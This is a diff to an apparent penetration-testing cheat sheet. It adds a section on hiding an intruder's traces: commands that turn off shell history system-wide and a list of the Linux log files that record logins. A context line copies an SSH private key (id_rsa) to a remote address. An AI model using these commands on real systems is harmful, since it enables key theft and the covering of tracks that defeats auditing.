@@ -60,7 +60,9 @@ ____
 * #### [Netcat](#netcat_transfer)
 * #### [Python](#python_transfer)
 * #### [SCP](#scp_transfer)
-
+### Traces of stay in the system
+* #### [Disable Saving Command History](#disable_saving_command_history)
+* #### [Linux Logs](#linux_logs)
 ____
 
 ### Reverse shell > <a name="reverse_shell_bash"></a>Bash
@@ -683,6 +685,33 @@ scp id_rsa username@10.10.164.167:~/destination -P 1337
 ###### Download from remote computer
 ```html
 scp user@10.10.164.167:~/path_to_file file_saved -P 1337
+```
+
+____
+
+### Traces of stay in the system > <a name="disable_saving_command_history"></a>Disable Saving Command History
+###### Disable shell variable HISTFILE at login
+```html
+echo "unset HISTFILE" | sudo tee /etc/profile.d/unset_histfile.sh
+```
+###### If necessary, set the HISTSIZE shell variable to 0 to prevent commands from being stored in history.
+```html
+echo "HISTSIZE=0" | sudo tee /etc/profile.d/disable_histsize.sh
+```
+* #### [Linux Logs](#linux_logs)
+###### binary files
+```html
+/var/run/utmp -- current connections to the system
+/var/log/wtmp -- history of connections to the system
+/var/log/btmp -- failed login attempts
+/var/log/lastlog -- users last login
+```
+###### text files
+```html
+/var/log/auth.log -- user authentication information
+/var/log/audit/audit.log -- access denial information
+/var/log/messages -- message log
+/var/log/security -- user authentication information
 ```
 ____
 
